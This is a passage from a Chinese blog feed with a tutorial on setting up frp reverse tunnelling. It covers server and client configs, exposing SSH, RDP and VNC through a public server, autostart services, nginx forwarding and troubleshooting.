/usr/lib/systemd/system/frp.service</span><br></pre></td></tr></table></figure><p> 写入以下内容，注意上文移动放置的路径和此处有关。这里是启动的<strong>服务端</strong>。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=The nginx HTTP and reverse proxy server</span><br><span class="line">After=network.target remote-fs.target nss-lookup.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">ExecStart=/usr/local/frp/frps -c /usr/local/frp/frps.ini</span><br><span class="line">KillSignal=SIGQUIT</span><br><span class="line">TimeoutStopSec=<span class="number">5</span></span><br><span class="line">KillMode=<span class="keyword">process</span></span><br><span class="line">PrivateTmp=true</span><br><span class="line">StandardOutput=syslog</span><br><span class="line">StandardError=inherit</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><p><img src="https://oss.iyouhun.com/img/QQ20211125-105241@2x.png" alt=""></p><p>重新加载服务的配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl daemon-reload</span><br></pre></td></tr></table></figure><p>现在就可以用 systemctl 套装来控制 frp 了。</p><p><strong>启动/停止/重启，查看状态，设置开机自启/关闭开机自启</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">systemctl start frp</span><br><span class="line">systemctl stop frp</span><br><span class="line">systemctl restart frp</span><br><span class="line">systemctl status frp</span><br><span class="line">systemctl enable frp</span><br><span class="line">systemctl disable frp</span><br></pre></td></tr></table></figure><p><img src="https://oss.iyouhun.com/img/QQ20211125-105648@2x.png" alt=""></p><h2 id="配置和使用"><a href="#配置和使用" class="headerlink" title="配置和使用"></a>配置和使用</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p><strong>frps.ini</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span> <span class="comment">#必须设置</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span> #是自己设定的frp服务端端口</span><br><span class="line"><span class="attr">vhost_http_port</span> = <span class="number">80</span> #是自己设定的http访问端口</span><br><span class="line"><span class="attr">token</span> = <span class="number">123</span>  #核实身份用，加了更安全</span><br><span class="line"></span><br><span class="line"><span class="section">[ssh]</span> <span class="comment">#ssh反向代理(不是必须设置)</span></span><br><span class="line"><span class="attr">listen_port</span> = <span class="number">6000</span> 是自己设定的ssh访问端口</span><br><span class="line"></span><br><span class="line"><span class="section">[web]</span> <span class="comment">#http反向代理[]里的内容可以自己设定，但是客户端和服务端必须要对应(如[aaa],[bbb])；</span></span><br><span class="line"><span class="attr">type</span> = http #为服务类型，可以设为http,https</span><br><span class="line"><span class="attr">custom_domains</span> = test1.a.com #为要映射的域名，记得域名的A记录要解析到外网主机的IP。</span><br><span class="line"></span><br><span class="line"><span class="section">[web2]</span> <span class="comment">#同上(可设置多个)</span></span><br></pre></td></tr></table></figure><p><strong>示例</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">vhost_http_port</span> = <span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="section">[ssh]</span></span><br><span class="line"><span class="attr">listen_port</span> = <span class="number">6000</span></span><br><span class="line"></span><br><span class="line"><span class="section">[web]</span></span><br><span class="line"><span class="attr">type</span> = http</span><br><span class="line"><span class="attr">custom_domains</span> = test1.a.com</span><br><span class="line"></span><br><span class="line"><span class="section">[web2]</span></span><br><span class="line"><span class="attr">type</span> = http</span><br><span class="line"><span class="attr">custom_domains</span> = test2.a.com</span><br></pre></td></tr></table></figure><p><strong>启动</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./frps -c ./frps.ini</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 后台启动</span></span><br><span class="line">nohup ./frps -c ./frps.ini &amp;</span><br></pre></td></tr></table></figure><p><img src="https://oss.iyouhun.com/img/QQ20211125-144701@2x.png" alt=""></p><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p><strong>frpc.ini</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = 远程frp服务器ip</span><br><span class="line"><span class="attr">server_port</span> = 远程frp服务器端口</span><br><span class="line"><span class="attr">token</span> = 远程frp服务器token</span><br><span class="line"></span><br><span class="line"><span class="section">[http]</span></span><br><span class="line"><span class="attr">type</span> = http</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = 本地端口号</span><br><span class="line"><span class="attr">remote_port</span> = 远程frp服务器的http服务端口号</span><br><span class="line"><span class="attr">custom_domains</span> = 自定义配置的域名</span><br><span class="line"><span class="attr">subdomain</span> = 匹配服务端配置的subdomain_host</span><br></pre></td></tr></table></figure><p><strong>示例</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = xx.xx.xx.xx</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">token</span> = <span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="section">[web]</span> </span><br><span class="line"><span class="attr">type</span> = http</span><br><span class="line"><span class="attr">custom_domains</span> = xx.xx.xx.xx</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">8080</span></span><br><span class="line"><span class="attr">custom_domains</span> = xxx.xxx.xxx</span><br><span class="line"><span class="attr">subdomain</span> = k2p</span><br></pre></td></tr></table></figure><p><strong>启动</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c ./frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 后台启动</span></span><br><span class="line">nohup ./frpc -c ./frpc.ini &amp;</span><br></pre></td></tr></table></figure><p><img src="https://oss.iyouhun.com/img/QQ20211125-144813@2x.png" alt=""></p><h2 id="访问内网http-https服务"><a href="#访问内网http-https服务" class="headerlink" title="访问内网http/https服务"></a>访问内网http/https服务</h2><h4 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h4><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = FRP服务端IP</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">vhost_http_port</span> = <span class="number">80</span> #可自定义</span><br><span class="line"><span class="attr">vhost_https_port</span> = <span class="number">443</span> #可自定义</span><br><span class="line"><span class="attr">token</span>= <span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="section">[web]</span> </span><br><span class="line"><span class="attr">type</span> = http</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">8080</span></span><br><span class="line"><span class="attr">custom_domains</span> = 自定义域名</span><br></pre></td></tr></table></figure><p>运行服务后访问 <strong>custom_domains:vhost_http_port </strong></p><p>示例：<a href="http://123.123.123.123" target="_blank" rel="noopener">http://123.123.123.123</a>   80可以省略</p><h2 id="连接内网SSH"><a href="#连接内网SSH" class="headerlink" title="连接内网SSH"></a>连接内网SSH</h2><h4 id="客户端配置-1"><a href="#客户端配置-1" class="headerlink" title="客户端配置"></a>客户端配置</h4><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = FRP服务端IP</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">token</span>= <span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="section">[ssh]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">22</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">6000</span></span><br></pre></td></tr></table></figure><p>运行服务后使用 ssh 工具直接连接即可<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh 用户名@服务端ip  -p 端口号</span><br><span class="line"><span class="meta">#</span><span class="bash"> ssh youhun@x.x.x.x -p 6000 （将 x.x.x.x 替换成公网服务器 IP 地址）</span></span><br></pre></td></tr></table></figure></p><h2 id="远程连接Windows电脑-RDP"><a href="#远程连接Windows电脑-RDP" class="headerlink" title="远程连接Windows电脑(RDP)"></a>远程连接Windows电脑(RDP)</h2><h4 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h4><p>1.服务器放开端口 <code>3389</code>也可以自定义，我这里用 <code>7001</code></p><p>2.开启windows电脑的<code>允许远程连接</code> </p><p><strong>桌面 -&gt; 此电脑 -&gt; 图标右键 -&gt; 属性 -&gt; 远程设置 -&gt; 修改为允许远程连接到此计算机</strong></p><p><img src="https://oss.iyouhun.com/img/727110ef3741620a56ea3d2731ee6a84.png" alt=""></p><p><strong>Win10 以上系统直接设置中打开远程桌面即可</strong></p><p><img src="https://oss.iyouhun.com/img/20210530213944.png" alt=""></p><h4 id="客户端配置-2"><a href="#客户端配置-2" class="headerlink" title="客户端配置"></a>客户端配置</h4><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = FRP服务端IP</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">token</span>= <span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="section">[RDP]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">3389</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">7001</span></span><br></pre></td></tr></table></figure><h4 id="新建-RDP-连接"><a href="#新建-RDP-连接" class="headerlink" title="新建 RDP 连接"></a>新建 RDP 连接</h4><p>现在我们在外网任意一台电脑，搜索并打开windows远程桌面程序</p><p><img src="https://oss.iyouhun.com/img/20210530214333.png" alt=""></p><p>输入 <code>服务器IP:remote_port</code> 例如：1.2.3.4:7001，就可以连接到内网的windows了。</p><p><img src="https://oss.iyouhun.com/img/20210530214443.png" alt=""></p><p>在此过程中需要输入内网电脑的用户名和开机密码后才能进行远程操控。</p><h4 id="设置开机自启"><a href="#设置开机自启" class="headerlink" title="设置开机自启"></a>设置开机自启</h4><p>windows 设置开机自启的方法有很多，这里推荐使用<code>winsw</code>将frp注册为系统服务。</p><p>参考链接：<a href="https://blog.csdn.net/atmosphere_/article/details/104018900" target="_blank" rel="noopener">https://blog.csdn.net/atmosphere_/article/details/104018900</a></p><p>这个方法最稳定，这是我最终用的方法。</p><h2 id="远程连接Mac电脑-VNC"><a href="#远程连接Mac电脑-VNC" class="headerlink" title="远程连接Mac电脑(VNC)"></a>远程连接Mac电脑(VNC)</h2><h4 id="准备工作-1"><a href="#准备工作-1" class="headerlink" title="准备工作"></a>准备工作</h4><p>1.服务器放开端口 <code>5900</code></p><p>2.进入 Mac 的【系统偏好设置】-&gt;【共享】，勾选“屏幕共享”和“远程登录”，用户为“所有用户”</p><p><img src="https://oss.iyouhun.com/img/880248658-5e424103a6016_fix732.png" alt=""></p><h4 id="客户端配置-3"><a href="#客户端配置-3" class="headerlink" title="客户端配置"></a>客户端配置</h4><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">server_addr</span> = FRP服务端IP</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">7000</span></span><br><span class="line"><span class="attr">token</span> = <span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="section">[vnc]</span></span><br><span class="line"><span class="attr">type</span> = tcp</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">5900</span></span><br><span class="line"><span class="attr">remote_port</span> = <span class="number">5900</span></span><br><span class="line"><span class="attr">use_encryption</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">use_compression</span> = <span class="literal">true</span></span><br></pre></td></tr></table></figure><h4 id="新建-VNC-连接"><a href="#新建-VNC-连接" class="headerlink" title="新建 VNC 连接"></a>新建 VNC 连接</h4><p><img src="https://oss.iyouhun.com/img/QQ20211203-144211@2x.png" alt=""></p><p>连接成功后，输入 Mac 的用户名和密码就行</p><h4 id="设置开机自启-1"><a href="#设置开机自启-1" class="headerlink" title="设置开机自启"></a>设置开机自启</h4><p>1.进入内网 Mac 系统，执行下列操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 编辑自启动文件</span></span><br><span class="line">touch ~/Library/LaunchAgents/frpc.plist</span><br><span class="line">vim ~/Library/LaunchAgents/frpc.plist</span><br></pre></td></tr></table></figure><p>2.<code>frpc.plist</code> 文件内容如下，注意文件中的 <code>frpc</code> 和 <code>frpc.ini</code> 路径，可以将这两个文件移到下方配置文件的路径下或者修改为你的路径</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span><br><span class="line"><span class="meta">&lt;!DOCTYPE plist PUBLIC -//Apple Computer//DTD PLIST 1.0//EN</span></span><br><span class="line"><span class="meta">http://www.apple.com/DTDs/PropertyList-1.0.dtd &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">"1.0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>Label<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>frpc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>ProgramArguments<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">string</span>&gt;</span>/usr/local/bin/frpc/frpc<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">string</span>&gt;</span>/usr/local/bin/frpc/frpc.ini<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>KeepAlive<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">key</span>&gt;</span>RunAtLoad<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></span><br></pre></td></tr></table></figure><p>3.加载并生效</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo chown root ~/Library/LaunchAgents/frpc.plist</span><br><span class="line">sudo launchctl load -w ~/Library/LaunchAgents/frpc.plist</span><br></pre></td></tr></table></figure><h2 id="绑定域名"><a href="#绑定域名" class="headerlink" title="绑定域名"></a>绑定域名</h2><h3 id="取消端口访问http服务"><a href="#取消端口访问http服务" class="headerlink" title="取消端口访问http服务"></a>取消端口访问http服务</h3><p>每次访问域名都需要加上端口很麻烦，可以设置 Nginx 转发</p><p>在客户端配置文件中设置域名，记得将域名解析到公网 IP</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[web]</span> </span><br><span class="line"><span class="attr">type</span> = http</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">8080</span></span><br><span class="line"><span class="attr">custom_domains</span> = test.iyouhun.com;</span><br></pre></td></tr></table></figure><p>然后设置 Nginx 转发</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">          <span class="attribute">listen</span> <span class="number">80</span>; <span class="comment">#监听http的80端口</span></span><br><span class="line">          <span class="attribute">server_name</span> test.iyouhun.com;  <span class="comment"># 这是我们设置的域名</span></span><br><span class="line">          <span class="attribute">access_log</span>  logs/test.iyouhun.com.log  main; <span class="comment"># 记录日志</span></span><br><span class="line">          <span class="attribute">location</span> / &#123;</span><br><span class="line">                  <span class="attribute">proxy_pass</span> http://127.0.0.1:7001; <span class="comment"># 转发到我们在frps.ini中设置的vhost_http_port端口</span></span><br><span class="line">                  <span class="attribute">proxy_set_header</span>    Host            <span class="variable">$host</span>:<span class="number">80</span>;  <span class="comment">#不添加这行时访问需要 域名:7001才能访问到内网的机器，如果加了就不再需要后面的端口，直接使用域名访问</span></span><br><span class="line">                  <span class="attribute">proxy_set_header</span>    X-Real-IP       <span class="variable">$remote_addr</span>;</span><br><span class="line">                  <span class="attribute">proxy_set_header</span>    X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>;</span><br><span class="line">                  <span class="attribute">proxy_hide_header</span>   X-Powered-By;</span><br><span class="line">          &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h3 id="配置泛域名-frp默认域名"><a href="#配置泛域名-frp默认域名" class="headerlink" title="配置泛域名(frp默认域名)"></a>配置泛域名(frp默认域名)</h3><p><strong>域名解析</strong></p><p>解析两条A记录：<code>frp.xxx.com</code> 和 <code>*.frp.xxx.com</code>，都指向你的云服务器ip，稍等一会，<code>ping frp.xxx.com</code>，如果能<code>ping</code>通说明解析成功</p><p><strong>配置服务端</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># frps.ini</span></span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">7000</span></span><br><span class="line">...</span><br><span class="line"><span class="attr">subdomain_host</span> = frp.xxx.com</span><br></pre></td></tr></table></figure><p><strong>客户端使用</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># frpc.ini</span></span><br><span class="line"><span class="section">[web]</span> </span><br><span class="line"><span class="attr">type</span> = http</span><br><span class="line"><span class="attr">local_ip</span> = <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line"><span class="attr">local_port</span> = <span class="number">8080</span></span><br><span class="line"><span class="comment"># 与frps中的subdomain_host连接起来就是 test.frp.xxx.com</span></span><br><span class="line"><span class="attr">subdomain</span> = test #自定义域名前缀</span><br></pre></td></tr></table></figure><p>访问域名：<code>test.frp.xxx.com:vhost_http_port</code></p><p>注：如果 frps 配置了 <code>subdomain_host</code>，则 <code>custom_domains</code> 中不能是属于 <code>subdomain_host</code> 的子域名或者泛域名。</p><h4 id="配置Nginx"><a href="#配置Nginx" class="headerlink" title="配置Nginx"></a>配置Nginx</h4><p>还是老样子，每次都加端口访问太麻烦了，因此使用 Nginx 做下转发</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line"><span class="comment"># 监听的80端口</span></span><br><span class="line"><span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line"><span class="comment"># 域名配置 记得一定要加上*.frp.xxx.com这个，只加frp.xxx.com是不行的</span></span><br><span class="line"><span class="attribute">server_name</span> * .frp.xxx.com frp.xxx.com;</span><br><span class="line"><span class="attribute">location</span> / &#123;</span><br><span class="line"><span class="attribute">proxy_pass</span> http: //<span class="number">127.0.0.1:8080</span>;</span><br><span class="line"><span class="comment"># 这个Host的header一定要加，不然转发后frp拿不到通过哪个域名访问的，导致转发失败</span></span><br><span class="line"><span class="attribute">proxy_set_header</span> Host <span class="variable">$host</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="相关问题"><a href="#相关问题" class="headerlink" title="相关问题"></a>相关问题</h2><h3 id="启动不了"><a href="#启动不了" class="headerlink" title="启动不了"></a>启动不了</h3><p>服务端和客户端启动不了的情况下,并且没有报错误,有概率是因为文件没有执行权限</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 赋值权限命令</span></span><br><span class="line">chomd 777 文件名</span><br></pre></td></tr></table></figure><h3 id="服务端启动报错-Exec-format-error"><a href="#服务端启动报错-Exec-format-error" class="headerlink" title="服务端启动报错 Exec format error"></a>服务端启动报错 Exec format error</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/frpc: cannot execute binary file: Exec format error</span><br></pre></td></tr></table></figure><p>这是下载错文件了，下载的 FRP 与操作系统处理器架构不匹配，需要重新下载正确的文件。</p><p>可以使用 <code>arch</code>、<code>uname -a</code> 等命令查看系统架构。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">arch</span><br><span class="line"><span class="meta">#</span><span class="bash">x86_64</span></span><br></pre></td></tr></table></figure><h3 id="vue-项目出现Invalid-Host-header解决办法"><a href="#vue-项目出现Invalid-Host-header解决办法" class="headerlink" title="vue 项目出现Invalid Host header解决办法"></a>vue 项目出现Invalid Host header解决办法</h3><p> // vue.config.js文件中增加<code>disableHostCheck</code>属性</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">module.exports = &#123;</span><br><span class="line">  devServer: &#123;</span><br><span class="line">    disableHostCheck: true</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;实现内网穿需要有一台公网服务器、域名。&lt;em&gt;（本文将公网服务器称为服务端，内网服务器称为客户端）&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;frp-是什么&quot;&gt;&lt;a href=&quot;#frp-是什么&quot; class=&quot;headerli
      
    
    </summary>
    
      <category term="工具" scheme="//www.shen.ee/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="frp" scheme="//www.shen.ee/tags/frp/"/>
    
      <category term="内网穿透" scheme="//www.shen.ee/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"/>
    
      <category term="frp搭建" scheme="//www.shen.ee/tags/frp%E6%90%AD%E5%BB%BA/"/>
    
      <category term="内网穿透搭建" scheme="//www.shen.ee/tags/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>青龙面板&amp;xdd-plus&amp;傻妞sillyGirl&amp;nvjdc保姆级安装系列教程</title>
    <link href="//www.shen.ee/article/12570.html"/>
    <id>//www.shen.ee/article/12570.html</id>
    <published>2021-11-23T08:07:30.000Z</published>
    <updated>2022-06-22T06:24:26.011Z</updated>
    
